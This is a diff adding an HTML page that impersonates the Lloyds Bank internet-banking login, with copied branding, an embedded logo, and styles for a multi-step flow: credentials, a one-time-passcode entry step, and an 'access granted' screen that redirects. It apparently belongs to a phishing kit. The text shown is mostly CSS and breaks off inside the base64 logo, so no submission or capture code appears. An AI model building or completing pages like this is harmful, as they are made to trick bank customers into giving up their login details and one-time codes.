@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lloyds Bank | Log in to Internet Banking</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Helvetica Neue', Arial, sans-serif; background: #f5f5f5; color: #111; min-height: 100vh; display: flex; flex-direction: column; font-size: 14px; }
+
+    /* ── Top nav ── */
+    .topnav { background: #222; display: flex; }
+    .topnav a { color: #bbb; font-size: 12px; padding: 8px 16px; text-decoration: none; border-right: 1px solid #333; }
+    .topnav a:first-child { border-left: 1px solid #333; }
+    .topnav a.active { background: #006A3E; color: #fff; font-weight: 600; }
+    .topnav a:not(.active):hover { background: #333; color: #fff; }
+
+    /* ── Header ── */
+    header { background: #006A3E; padding: 12px 32px; display: flex; align-items: center; justify-content: space-between; }
+    .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
+    .logo-horse { width: 52px; height: 52px; background: #fff; border-radius: 6px; display: flex; align-items: center; justify-content: center; overflow: hidden; flex-shrink: 0; }
+    .logo-horse img { width: 48px; height: 48px; object-fit: contain; }
+    .logo-brand { color: #fff; font-size: 28px; font-weight: 900; letter-spacing: 5px; }
+    .header-right { color: rgba(255,255,255,.85); font-size: 12px; display: flex; align-items: center; gap: 5px; }
+
+    /* ── Main ── */
+    main { flex: 1; display: flex; justify-content: center; padding: 36px 20px 60px; }
+    .wrap { width: 100%; max-width: 940px; display: grid; grid-template-columns: 1fr 300px; gap: 24px; align-items: start; }
+
+    /* ── Card ── */
+    .card { background: #fff; border: 1px solid #ddd; border-top: 4px solid #006A3E; }
+    .card-head { padding: 20px 24px 0; border-bottom: 1px solid #e8e8e8; }
+    .card-head h1 { font-size: 20px; font-weight: 700; margin-bottom: 16px; color: #111; }
+
+    /* Step tabs */
+    .tabs { display: flex; }
+    .tab { flex: 1; padding: 10px 6px; display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 11px; font-weight: 600; color: #aaa; border-bottom: 3px solid transparent; text-transform: uppercase; letter-spacing: .3px; }
+    .tab.active { color: #006A3E; border-bottom-color: #006A3E; }
+    .tab.done   { color: #555; border-bottom-color: #006A3E; }
+    .step-num { width: 20px; height: 20px; border-radius: 50%; background: #ddd; color: #888; font-size: 10px; font-weight: 800; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .tab.active .step-num { background: #006A3E; color: #fff; }
+    .tab.done   .step-num { background: #004325; color: #fff; }
+
+    .card-body { padding: 26px 24px; }
+    .step { display: none; }
+    .step.active { display: block; }
+
+    /* Form */
+    .fg { margin-bottom: 18px; }
+    .fg label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 6px; color: #222; }
+    .fg input, .fg select { width: 100%; padding: 10px 12px; border: 2px solid #ccc; border-radius: 3px; font-size: 14px; color: #111; outline: none; -webkit-appearance: none; appearance: none; background: #fff; }
+    .fg input:focus, .fg select:focus { border-color: #006A3E; box-shadow: 0 0 0 3px rgba(0,106,62,.1); }
+    .fg select { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23666' stroke-width='1.5' fill='none'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 12px center; padding-right: 34px; }
+    .hint { font-size: 12px; color: #666; margin-top: 4px; line-height: 1.5; }
+
+    .chk { display: flex; align-items: center; gap: 9px; font-size: 13px; color: #444; cursor: pointer; margin-bottom: 20px; }
+    .chk input { width: 16px; height: 16px; accent-color: #006A3E; }
+
+    .btn { width: 100%; padding: 13px; background: #006A3E; color: #fff; font-size: 15px; font-weight: 700; border: none; border-radius: 3px; cursor: pointer; margin-bottom: 16px; }
+    .btn:hover { background: #005530; }
+
+    hr { border: none; border-top: 1px solid #eee; margin: 18px 0; }
+    .links { display: flex; flex-direction: column; gap: 9px; }
+    .links a { font-size: 13px; color: #006A3E; text-decoration: underline; cursor: pointer; }
+
+    /* Step 2 info box */
+    .info-bar { background: #E8F5ED; border-left: 4px solid #006A3E; padding: 10px 14px; font-size: 13px; color: #004325; margin-bottom: 20px; line-height: 1.55; border-radius: 0 3px 3px 0; }
+
+    /* OTP step */
+    .otp-box { background: #E8F5ED; border: 1px solid #b8d9c3; border-left: 4px solid #006A3E; border-radius: 3px; padding: 14px 16px; margin-bottom: 22px; font-size: 13px; color: #004325; line-height: 1.6; }
+    .otp-box strong { display: block; font-size: 14px; margin-bottom: 4px; }
+    .digits { display: flex; gap: 8px; margin-bottom: 6px; }
+    .digits input { width: 46px; height: 54px; text-align: center; font-size: 22px; font-weight: 700; border: 2px solid #ccc; border-radius: 3px; outline: none; }
+    .digits input:focus { border-color: #006A3E; box-shadow: 0 0 0 3px rgba(0,106,62,.1); }
+    .resend-txt { font-size: 12px; color: #666; margin-bottom: 20px; }
+    .resend-txt a { color: #006A3E; }
+
+    /* Granted step */
+    .granted { text-align: center; padding: 20px 0 8px; }
+    .tick-circle { width: 70px; height: 70px; background: #006A3E; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 18px; animation: pop .4s ease; }
+    @keyframes pop { 0%{transform:scale(.3);opacity:0} 80%{transform:scale(1.1)} 100%{transform:scale(1);opacity:1} }
+    .granted h2 { font-size: 20px; font-weight: 700; color: #004325; margin-bottom: 8px; }
+    .granted p  { font-size: 13px; color: #555; line-height: 1.6; margin-bottom: 4px; }
+    .redir-bar { margin-top: 20px; background: #E8F5ED; border: 1px solid #b8d9c3; border-radius: 3px; padding: 14px; font-size: 13px; color: #004325; }
+    .redir-bar strong { display: block; font-size: 14px; margin-bottom: 4px; }
+    .prog-track { margin-top: 8px; height: 4px; background: #b8d9c3; border-radius: 3px; overflow: hidden; }
+    .prog-fill  { height: 100%; width: 0%; background: #006A3E; border-radius: 3px; }
+
+    /* ── Sidebar ── */
+    .side { display: flex; flex-direction: column; gap: 16px; }
+    .sbox { background: #fff; border: 1px solid #ddd; border-radius: 2px; overflow: hidden; }
+    .sbox-h { background: #004325; padding: 10px 14px; color: #fff; font-size: 13px; font-weight: 700; }
+    .sbox-b { padding: 14px; font-size: 13px; color: #555; line-height: 1.55; }
+    .sbox-b p { margin-bottom: 8px; }
+    .sbox-b a { color: #006A3E; text-decoration: underline; }
+    .fraud-alert { background: #fff8e1; border: 1px solid #f0c040; border-left: 4px solid #d4a017; border-radius: 2px; padding: 12px 14px; font-size: 12px; color: #5a3e00; line-height: 1.55; }
+    .fraud-alert strong { display: block; font-size: 13px; margin-bottom: 3px; }
+
+    /* ── Footer ── */
+    footer { background: #1a1a1a; padding: 18px 32px; }
+    .flinks { display: flex; flex-wrap: wrap; margin-bottom: 10px; }
+    .flinks a { color: #999; font-size: 11px; text-decoration: none; padding: 0 10px; border-right: 1px solid #444; }
+    .flinks a:first-child { padding-left: 0; }
+    .flinks a:last-child  { border-right: none; }
+    .flinks a:hover { color: #ccc; }
+    .fcopy { color: #666; font-size: 11px; line-height: 1.6; }
+
+    @media(max-width:700px){ .wrap{grid-template-columns:1fr} header{padding:12px 16px} .card-body{padding:20px 16px} }
+  
+    @keyframes ld-spin  { to { transform: rotate(360deg); } }
+    @keyframes ld-dots  { 0%,80%,100%{transform:scale(0)}40%{transform:scale(1)} }
+  
+  </style>
+</head>
+<body>
+
+<div class="topnav">
+  <a href="#" class="active">Personal</a>
+  <a href="#">Business</a>
+  <a href="#">Private Banking</a>
+  <a href="#">International</a>
+</div>
+
+<header>
+  <a class="logo" href="#">
+    <div class="logo-horse">
+      <img src="data:image/jpeg;base64,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